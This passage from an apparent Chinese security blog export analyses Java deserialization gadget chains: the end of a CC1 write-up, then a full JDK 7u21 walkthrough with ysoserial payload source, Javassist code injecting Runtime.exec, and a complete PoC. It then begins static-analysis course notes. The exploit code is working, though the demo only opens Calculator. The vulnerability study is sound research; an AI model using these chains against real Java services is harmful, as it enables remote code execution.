我们poc中提供的this.memberValues中存在的一个键值对的键名与this.type的注解要存在注解元素名相等。（为了满足var7!=null） 所以我们选取了@Target注解作为this.type，我们就必须向this.memberValues写入一个value：xxx的键值对 这里的this.type是可以变动的，比如换成另一个元注释Retention.class（虽然他的注解元素名也是value），甚至可以自定义，但是对方服务器上没有这个注释，打别人是没有用的，所以还是选用大家都有的元注释。 同时我们写入的this.memberValues的键名不能改变，但是值可以改变。 例如innerMap.put(&quot;value&quot;,&quot;hello&quot;)，也是可以的。 限制点8u71之前都是可以使用的，在Java 8u71之后代码发生了变动。 看一下jdk8里面的sun.reflect.annotation.AnnotationInvocationHandler readObject复写点： 1234567891011121314151617181920212223242526272829303132private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; GetField var2 = var1.readFields(); Class var3 = (Class)var2.get(\"type\", (Object)null); Map var4 = (Map)var2.get(\"memberValues\", (Object)null); AnnotationType var5 = null; try &#123; var5 = AnnotationType.getInstance(var3); &#125; catch (IllegalArgumentException var13) &#123; throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map var6 = var5.memberTypes(); LinkedHashMap var7 = new LinkedHashMap(); String var10; Object var11; for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123; Entry var9 = (Entry)var8.next(); var10 = (String)var9.getKey(); var11 = null; Class var12 = (Class)var6.get(var10); if (var12 != null) &#123; var11 = var9.getValue(); if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) &#123; //很伤心的，没有了map赋值语句 var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + \"[\" + var11 + \"]\")).setMember((Method)var5.members().get(var10)); &#125; &#125; &#125; //省略...&#125; 因为这个函数出现了变动，不再有针对构造的map的赋值语句，所以触发不了漏洞。 而是改成了新建一个LinkedHashMap，把值转进这个LinkedHashMap里面。有空之后补上。 总结那么整个cc1链就分析结束了，从PoC角度进行一下步骤总结： 首先sun.reflect.annotation.AnnotationInvocationHandler#readObject函数会将payload读取，在经过函数内部一系列的var变量解析之后，会在构造好的Map数据结构中直接setValue赋值操作。 setValue函数是org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue； 它内部有一个transform危险函数，这个函数会循环解析payload封装好的transformer数组。 这个transformer数组是org.apache.commons.collections.functors.ChainedTransformer#iTransformers； 可以看到是经过ChainedTransformer数据结构封装好的 在构造map对象的时候，我们通过decorate函数org.apache.commons.collections.map.TransformedMap#decorate，将我们的transformer数组，也就是恶意转换链配置好，一旦出现map赋值操作，他就会自动解析我们的恶意转换链，触发漏洞。 参考1 2","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}]},{"title":"【反序列化漏洞】JDK7u21","slug":"【反序列化漏洞】JDK7u21","date":"2020-09-08T01:58:22.000Z","updated":"2020-09-11T02:30:51.849Z","comments":true,"path":"【反序列化漏洞】JDK7u21/","link":"","permalink":"https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91JDK7u21/","excerpt":"序言 往事依稀浑似梦，都随风雨到心头。 终于开学了，疯狂更博启动。","text":"序言 往事依稀浑似梦，都随风雨到心头。 终于开学了，疯狂更博启动。 环境搭建JDK–JRE ​ -tools:javac,… ​ -lib ​ -cmd:jar 查看系统已安装的Java版本和路径：/usr/libexec/java_home -V Java se 7的所有版本 存在缺陷版本：JRE -V &lt;= 7u21 需要ysoserial的搭配 漏洞演示exp1234567891011121314151617181920212223242526272829303132333435363738394041import ysoserial.payloads.Jdk7u21;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;/** * @program: 7u21 * * @description: * * @author: 0range * * @create: 2020-09-07 16:02 **/public class JDK7u21Test &#123; public static void main(String[] args) &#123; try &#123; Object calc = new Jdk7u21().getObject(\"open /Applications/Calculator.app/Contents/MacOS/Calculator\"); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(calc);//序列化对象 objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray();//读取序列化后的对象byte数组 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流 ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 执行结果： 跟进看ysoserial部分的payload： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package ysoserial.payloads;import java.lang.reflect.InvocationHandler;import java.util.HashMap;import java.util.LinkedHashSet;import javax.xml.transform.Templates;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.Dependencies;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.Gadgets;import ysoserial.payloads.util.JavaVersion;import ysoserial.payloads.util.PayloadRunner;import ysoserial.payloads.util.Reflections;/*Gadget chain that works against JRE 1.7u21 and earlier. Payload generation hasthe same JRE version requirements.See: https://gist.github.com/frohoff/24af7913611f8406eaf3Call tree:LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.&lt;clinit&gt;() ... Runtime.exec() */@SuppressWarnings(&#123; \"rawtypes\", \"unchecked\" &#125;)@PayloadTest ( precondition = \"isApplicableJavaVersion\")@Dependencies()@Authors(&#123; Authors.FROHOFF &#125;)public class Jdk7u21 implements ObjectPayload&lt;Object&gt; &#123; @Override public Object getObject(final String command) throws Exception &#123; final Object templates = Gadgets.createTemplatesImpl(command); String zeroHashCodeStr = \"f5a5a608\"; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = Gadgets.createProxy(tempHandler, Templates.class); LinkedHashSet set = new LinkedHashSet(); // maintain order set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, \"_auxClasses\", null); Reflections.setFieldValue(templates, \"_class\", null); map.put(zeroHashCodeStr, templates); // swap in real object return set; &#125; public static boolean isApplicableJavaVersion() &#123; JavaVersion v = JavaVersion.getLocalVersion(); return v != null &amp;&amp; (v.major &lt; 7 || (v.major == 7 &amp;&amp; v.update &lt;= 21)); &#125; public static void main(final String[] args) throws Exception &#123; PayloadRunner.run(Jdk7u21.class, args); &#125;&#125; 为什么是“f5a5a608”这个字符串，因为hashcode（）方法计算结果为0；这个之后会用到。 1234567891011121314public int hashCode() &#123; int h = hash; if (h == 0 &amp;&amp; count &gt; 0) &#123; int off = offset; char val[] = value; int len = count; for (int i = 0; i &lt; len; i++) &#123; h = 31*h + val[off++]; &#125; hash = h; &#125; return h; &#125; 漏洞分析1-createTemplatesImpl 继续跟 能看到： 在利用 payload 中，TemplatesImpl 类主要的作用为： 使用 _bytecodes 成员变量存储恶意字节码 ( 恶意class =&gt; byte array ) 提供加载恶意字节码并触发执行的函数，加载在 defineTransletClasses() 方法中，方法触发为 getOutputProperties() 或 newTransformer() 来具体看一下，该类位于 com.sun.org.apache.xalan.internal.xsltc.trax 包中，用于 xml document 的处理和转换，定义如下： 1public final class TemplatesImpl implements Templates, Serializable &#123; TemplatesImpl 类实现了 Templates 和 Serializable 两个接口 其中 Templates 接口定义如下，包含了两个方法，即之前提到触发恶意代码执行所的方法： 1234public interface Templates &#123; Transformer newTransformer() throws TransformerConfigurationException; Properties getOutputProperties();&#125; 在 TemplatesImpl 类中有一个 private 方法 defineTransletClasses()，精简后的代码如下: 1234567891011121314151617181920private byte[][] _bytecodes = null;...private void defineTransletClasses() throws TransformerConfigurationException &#123; ... TransletClassLoader loader = ... try &#123; for (int i = 0; i &lt; classCount; i++) &#123; // 调用 ClassLoader.defineClass() 方法加载 Class _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; &#125;&#125; 需要理解的是： 在方法中，调用了 ClassLoader.defineClass() 方法，参数为实例变量 _bytecodes 内的元素，该方法会将字节数组转换为 Class，并加载 也就是说，通过设置 _bytecodes 的内容 ，调用 defineTransletClasses() 方法即可加载指定的 Class。 find usages： 一共三处： getTransletClasses() getTransletIndex() getTransletInstance() 这里满足条件的就是第三个函数getTransletInstance() 跟进去看一下： 123456789101112private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // 创建实例 AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ... &#125; &#125; defineTransletClasses() 执行后，会调用之前加载的 Class 的 newInstance() 方法来创建实例，触发 static block 和 constructor 的执行，根据方法，调用关系如下： 1getOutputProperties() =&gt; newTransformer() =&gt; getTransletInstance() =&gt; defineTransletClasses() =&gt; ClassLoader.defineClass() 可以看到调用 getOutputProperties() 或 newTransformer() 方法均可触发恶意代码的执行。 理一下思路 使用 javassist 库创建一个包含恶意代码的 class，恶意代码可以在 static block中，或在无参构造函数里 将恶意 class 的的字节码添加到 TemplatesImpl 实例的 _bytecodes 变量中 调用实例的 getOutputProperties() 或 newTransformer() 方法触发恶意代码执行 弹出计算器的代码示例如下 (程序报错可以忽略)： 1234567891011121314151617181920212223ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.get(Cat.class.getName()); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open -a /Applications/Calculator.app\\\");\"; // 创建 static 代码块，并插入恶意代码 cc.makeClassInitializer().insertBefore(cmd); // 使用构造方法也可以 //CtConstructor constructor = cc.getDeclaredConstructor(new CtClass[]&#123;&#125;); //constructor.insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // 为了使 _transletIndex 正确，并执行 newInstance()，具体可查看 defineTransletClasses 方法 cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // 获取字节码 byte[] evilByteCodes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;evilByteCodes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\" + System.nanoTime()); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); templates.newTransformer(); 在上面的代码示例中，是手动调用 newTransformer() 来触发恶意代码的执行，因此还需要找到一个能够在反序列化过程中，自动调用 (直接或间接) 该方法的类。 这里分为两部分,一部分是Javassist的动态注入，一部分是Templates 属性的设置。 Javassist的作用: 通过动态字节码生成一个类，该类的静态代码块中存储恶意代码。 Templates属性设置的作用: Templates.newTransformer() 实例化该恶意类从而触发其静态代码块中的恶意代码。 这部分的理解，可以通过调试这个简单的触发语句来理解: 123456public class Example &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(\"open /Applications/Calculator.app/Contents/MacOS/Calculator\"); calc.getOutputProperties(); &#125;&#125; 可以跟这个，看调用的细节： AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();调用_class[_transletIndex]类的无参构造方法,生成类对象。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061private void defineTransletClasses() throws TransformerConfigurationException &#123; // 这里我们传入了值 if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; // 引入加载器 TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; // 这里在其他版本会有一句_tfactory.getExternalExtensionsMap() // 为了防止出错，所以我们给_tfactory 设置 transFactory.newInstance() 这个带有getExternalExtensionsMap方法的实例 // 7u21版本下其实加不加都没关系。 return new TransletClassLoader(ObjectFactory.findClassLoader()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; // 根据_bytecodes传入的数目 _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new Hashtable(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; // 加载字节码转化为对应的类 _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class // _transletIndex 默认值是-1 // 所以为了不出错，所以这里字节码转换为对应类的时候，其父类必须是 // ABSTRACT_TRANSLET = com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; _class[i] = loader.defineClass(_bytecodes[i]); 加载类并不会触发静态方法,但是之后会有一个： 1AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); 进行实例化，从而触发我们javassist注入的静态恶意代码。 从上面我们简单归纳下执行的顺序: 1234561.TemplatesImpl.getOutputProperties()2.TemplatesImpl.newTransformer()3.TemplatesImpl.getTransletInstance()4.TemplatesImpl.defineTransletClasses()5.ClassLoader.defineClass()6.Class.newInstance() 1,2,3,4中都是可以触发的点，但是1,2 是public方法可以被对象直接调用，而3,4是private方法，只能被对象可调用方法间接调用。所以第二层的目标就是触发第一点或者第二点。 2-AnnotationInvocationHandler进入第二阶段： 123InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);Reflections.setFieldValue(tempHandler, \"type\", Templates.class);Templates proxy = Gadgets.createProxy(tempHandler, Templates.class); 第二层的核心是怎么触发第一层的TemplatesImpl.newTransformer() 这里选择newTransformer()方法来触发的 首先通过Reflections框架通过调用初始化函数创建一个AnnotationInvocationHandler对象实例。 然后设置了type属性为Templates.class； 这里被createProxy封装了。 在写个demo来debug理解： 1234567891011121314151617181920import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import ysoserial.payloads.util.Gadgets;import ysoserial.payloads.util.Reflections;import javax.xml.transform.Templates;import java.lang.reflect.InvocationHandler;import java.util.HashMap;public class Test2nd &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(\"open /Applications/Calculator.app/Contents/MacOS/Calculator\");//生成恶意的calc HashMap map = new HashMap(); InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = Gadgets.createProxy(tempHandler, Templates.class); proxy.equals(calc); &#125;&#125; 调用栈： 可以看到当调用方法名为equals 时，且参数个数和类型匹配，则调用内部 equalsImpl 方法 仔细看equalsImpl函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243private Boolean equalsImpl(Object var1) &#123; // 判断var1是否为AnnotationInvocationHandle,var1是templates，pass if (var1 == this) &#123; return true; // 构造限制点，type属性限制了var1必须为this.type的类实例 &#125; else if (!this.type.isInstance(var1)) &#123; return false; &#125; else &#123; //这里获取了当前成员的方法 Method[] var2 = this.getMemberMethods(); int var3 = var2.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; Method var5 = var2[var4]; //遍历获取方法 String var6 = var5.getName(); //获取方法名字 Object var7 = this.memberValues.get(var6);//获取memberValues中的值 Object var8 = null; // Proxy.isProxyClass(var1.getClass() // 判断varl是不是代理类,显然不是，pass AnnotationInvocationHandler var9 = this.asOneOfUs(var1); if (var9 != null) &#123; var8 = var9.memberValues.get(var6); &#125; else &#123; try &#123; // 这里直接进行了方法的调用核心。 // var5是方法名,var1是可控的类 // var1.var5() var8 = var5.invoke(var1); &#125; catch (InvocationTargetException var11) &#123; return false; &#125; catch (IllegalAccessException var12) &#123; throw new AssertionError(var12); &#125; &#125; if (!memberValueEquals(var7, var8)) &#123; return false; &#125; &#125; return true; &#125; &#125; 跟入后可以看到，首先获取 type Class 所有声明的方法，然后在参数 Object o 上使用反射调用方法，因此前面所说 TemplatesImpl 实例是需要作为参数传入： 12345678910111213141516171819private Boolean equalsImpl(Object o) &#123; // o 需要为 type 的实例 if (!this.type.isInstance(o)) &#123; return false; &#125; ... // 获取到 type Class 的方法 for (Method memberMethod : getMemberMethods()) &#123; ... AnnotationInvocationHandler hisHandler = asOneOfUs(o); if (hisHandler != null) &#123; hisValue = hisHandler.memberValues.get(member); &#125; else &#123; // 反射调用方法 hisValue = memberMethod.invoke(o); &#125; &#125; return true; &#125; 目的是触发TemplatesImpl.newTransformer() var1可以通过proxy(var1)方式去控制,那么var5怎么去控制呢？ Method[] var2 = this.getMemberMethods(); 可以看到这里获取了成员的方法，跟进去看看。 理一下思路 根据 TemplatesImpl 部分的说明，创建一个包含恶意代码的 TemplatesImpl 实例 evilTemplates 使用 AnnotationInvocationHandler 创建 proxy object 代理 Templates 接口 (会使用到反射) 调用 proxy object 的 equals 方法，将 evilTemplates 作为参数 例子： 123456789101112131415161718@Test public void testTemplateImpl() throws Exception &#123; Map map = new HashMap(); // AnnotationInvocationHandler 构造方法为 package private，需要使用反射创建实例 final Constructor&lt;?&gt; ctor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructors()[0]; ctor.setAccessible(true); // 构造 payload 时，因为新版 jdk 对 type 参数做了校验，必须为 Annotation // 为了不报错，所以设置为任意一个 Annotation，再用反射修改 type 参数 InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, map); // 反射设置属性值 setFieldValue(invocationHandler, \"type\", Templates.class); // 代理 Tempaltes 接口 Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler); // 获取包含恶意代码的 Templates 对象 Templates evilTemplates = getEvilTemplates(); // 触发恶意代码执行 proxy.equals(evilTemplates); &#125; 结果发现是通过反射机制从this.type这个类属性去获取的。 1Reflections.setFieldValue(tempHandler, \"type\", Templates.class); 所以这里我们只要控制type为Templates.class就行了。 里面就有newTransformer方法,且为第一个,如果是第二个、第三个话,前面可能会因为参数不对等原因出现错误，导致程序没能执行到newTransformer方法就中断了。 3-LinkedHashSet第三层的核心就是触发proxy.equals(calc); 这是最外层LinkedHashSet,这个对象在反序列化的时候会自动触发readObject方法,从而开始了exp的执行流程 在利用 payload 中，LinkedHashSet 是最外层的类，包含恶意代码的实例和proxy object 会作为元素添加到 set 中，在反序列化过程中，会调用到前一部分所说的 equals 方法，来具体看一下。 LinkedHashSet 位于 java.util 包中，是 HashSet 的子类，添加到 set 的元素会保持有序状态，内部实现基于 HashMap。 问题是如何触发equals方法，接下来仔细看一下： 1234public class LinkedHashSet&lt;E&gt; extends HashSet&lt;E&gt; implements Set&lt;E&gt;, Cloneable, java.io.Serializable &#123;&#125; 在 HashSet 的 writeObject() 方法中，会依次调用每个元素的 writeObject() 方法来实现序列化： 通过查看序列化规则writeObject： 12345678910111213141516private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException &#123; // Write out any hidden serialization magic s.defaultWriteObject(); // Write out HashMap capacity and load factor s.writeInt(map.capacity()); s.writeFloat(map.loadFactor()); // Write out size s.writeInt(map.size()); // Write out all elements in the proper order. for (E e : map.keySet()) s.writeObject(e); &#125; 逻辑规则： 123456s.defaultWriteObject();s.writeInt(map.capacity());s.writeFloat(map.loadFactor());s.writeInt(map.size());for (E e : map.keySet()) s.writeObject(e); 相应的，在反序列化过程中，会依次调用每个元素的 readObject() 方法，然后将其作为 key (value 为固定值) 依次放入 HashMap 中： 来看一下 HashMap 的 put() 方法，首先会调用内部 hash() 函数计算 key 的 hash 值，然后遍历所有元素，*当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *，则认为 key 已经存在，返回 oldValue，否则调用 addEntry() 添加元素： 12345678910111213141516171819202122public V put(K key, V value) &#123; if (key == null) return putForNullKey(value); // 计算 key 的 hash 值 int hash = hash(key); int i = indexFor(hash, table.length); // 遍历已有元素，检查 key 是否已经存在 for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; // hash 值相同，且key和Entry的key指向同一个对象 或 二者equals if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; addEntry(hash, key, value, i); return null; &#125; 代码中将已有元素的 *key* 值作为参数 (k 变量)，调用了插入 key 的 equals 方法来判断而这是否相等，这里我们只要反序列化过程中让 proxy object 先添加，然后再添加包含恶意代码的实例 (序列化时添加要顺序相反)。 理一下思路 创建一个 LinkedHashSet 先将 包含恶意代码的 Templates 对象添加到 hashSet 中 将使用 AnnotationInvocationHandler 创建的proxy object (代理 Templaes 接口) 添加到 hashSet 中，在反序列化过程中，会调用 proxy 的 equals 方法 (包含恶意代码的Templates 对象作为参数)，触发恶意代码执行 在反序列化过程中，需要保证 HashSet 内的 entry 保持有序，这也是为什么使用 LinkedHashSet 的原因。 根据代码分析，在执行到 equals() 之前，需要满足两个条件 e.hash == hash (k = e.key) != key 条件 2 比较两个变量是否指向同一个对象，这里满足(一个为包含恶意代码的templates 实例，一个为proxy object)，条件1判断的是 hash 值是否相等，来看一下 hash 值是如何计算的 123456789final int hash(Object k) &#123; int h = 0; ... // 调用了 k 的 hashCode h ^= k.hashCode(); h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125; 可以看到，计算结果只受 k.hashCode() 的影响 对于普通对象，返回的是就是 k.hashCode() 对用 proxy object，因为会统一调用 inove() ，而AnnotationInvocationHandler 在 inove() 方法中提供了 hashCode() 的实现，代码如下，内部调用了 hashCodeImpl() 12345678public Object invoke(Object obj, Method method, Object[] args) &#123; String methodName = method.getName(); ... &#125; else if (methodName.equals(\"hashCode\")) &#123; return this.hashCodeImpl(); &#125; ...&#125; hashCodeImpl() 代码如下 ，这里稍微修改了下代码，便于理解 12345678910111213private int hashCodeImpl() &#123; int result = 0; // 遍历 memberValues Iterator itr = this.memberValues.entrySet().iterator(); for( ;itr.hasNext(); ) &#123; Entry entry = (Entry)itr.next(); String key = ((String)entry.getKey()); Object value = entry.getValue(); // 127 * key 的 hashCode，再和 memberValueHashCode(value) 进行异或 result += 127 * key.hashCode() ^ memberValueHashCode(value); &#125; return result;&#125; for 循环内调用了 memberValueHashCode() 函数，其精简代码如下 12345678910private static int memberValueHashCode(Object var0) &#123; Class var1 = var0.getClass(); if (!var1.isArray()) &#123; // 匹配到该条件 return var0.hashCode(); &#125; else if (var1 == byte[].class) &#123; .... &#125; else &#123; ... &#125;&#125; for 循环内调用了 memberValueHashCode() 函数，其精简代码如下 12345678910private static int memberValueHashCode(Object var0) &#123; Class var1 = var0.getClass(); if (!var1.isArray()) &#123; // 匹配到该条件 return var0.hashCode(); &#125; else if (var1 == byte[].class) &#123; .... &#125; else &#123; ... &#125;&#125; 如果 Entry 的 value 的 Class 不为 Array，则 memberValueHashCode() 函数返回 value.hashCode()，在这里相当于 1127 * key.hashCode() ^ value.hashCode(); 为了让最后返回的 result 和 value.hashCode() 相同，这就要求 memberValues 仅有一个 entry，否则 for 循环内每次计算的结果会累加 key.hashCode() 的值为0，从而 127 * key.hashCode() = 0，0 和 任何数异或还是原值 value 和 之前添加到 hashset 的对象相同， (利用代码中该值为包含恶意代码的 templates 对象) 前面提到字符串 f5a5a608 的 hashCode 为 0，所以这里只要让 AnnotationInvocationHandler 的 memberValues 内只放一个 key 为字符串 f5a5a608，value 为包含恶意代码的 templates 对象即可 到这里，就可以写出完整的利用代码： 1234567891011121314151617181920212223242526 @Test public void testPoc() throws Exception &#123; Map map = new HashMap(); String magicStr = \"f5a5a608\"; final Constructor&lt;?&gt; ctor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructors()[0]; ctor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, map); setFieldValue(invocationHandler, \"type\", Templates.class); // value 先放入任意值，让 HashSet.add(proxy) 成功 map.put(magicStr, \"foo\"); Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler); Templates evilTemplates = getEvilTemplates(); HashSet target = new LinkedHashSet(); target.add(evilTemplates); target.add(proxy); // 放入实际的 value map.put(magicStr, evilTemplates); String filename = \"/tmp/jdk7u21\"; // 序列化 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename)); oos.writeObject(target); // 反序列化, boom ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject();&#125; 反序列化过程的方法调用链如下 123456789101112131415161718192021222324252627LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... // TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.&lt;clinit&gt;() ... Runtime.exec() 修复 在 jdk &gt; 7u21 的版本，修复了这个漏洞，看了下 7u79 的代码，AnnotationInvocationHandler 的 readObject() 方法增加了异常抛出，导致反序列化失败。 参考： 1 2","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}]},{"title":"【南京大学-软件分析】课程笔记","slug":"【南京大学-软件分析】课程笔记","date":"2020-08-16T08:13:59.000Z","updated":"2021-09-08T03:55:27.552Z","comments":true,"path":"【南京大学-软件分析】课程笔记/","link":"","permalink":"https://0range228.github.io/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/","excerpt":"序言 返景入深林，复照青苔上。 越来越发现基础知识的重要，前一阵又跟着老师过了一遍，理解更加深入了，顺便整理笔记。","text":"序言 返景入深林，复照青苔上。 越来越发现基础知识的重要，前一阵又跟着老师过了一遍，理解更加深入了，顺便整理笔记。 00 静态分析核心问题以下参考啥玩应儿 核心问题：Abstraction和Over-approximation Abstraction 程序在动态运行时，有很多变量的值是动态变化的。 比如一个是循环中，有一句new A()，那么每次循环都会在内存中生成一个A类对象，直到占满你的内存。 这过程中的每一个A都是Concreate Object 也就是具体对象，是真真切切在内存中存在的。 静态分析主要采用的方法就是为同一句new A() 只生成一个抽象的对象，也就是Abstract Object。 这里你的抽象程度、抽象方式、静态分析的精度和速度都是不同的。 Over-approximation 程序在动态执行时，其实根据输入的参数不同，执行的路径也会各不相同。 随着程序规模和复杂度的增加，路径也就会变得无穷无尽。 最终导致我们无法在有限的空间内枚举每一种执行路径，就会发生路径爆炸！ 为了可以在有限的空间内来枚举无限路径下的各种可能值，需要保守估计，也就是Over-approximation 容忍一定程度的路径不敏感 01PL：Programming Language理论：语言设计，类型系统，语义和逻辑 环境：编译器，运行系统 应用：程序分析，程序验证，程序合成 技术：抽象解释（Abstract interpretation），数据流分析（Data-flow analysis），Hoare logic，Model checking，Symbolic execution等等 静态分析作用：程序可靠性、程序安全性、编译优化、程序理解（调用关系、类型识别）。 Soundness &amp; Completeness 解释： 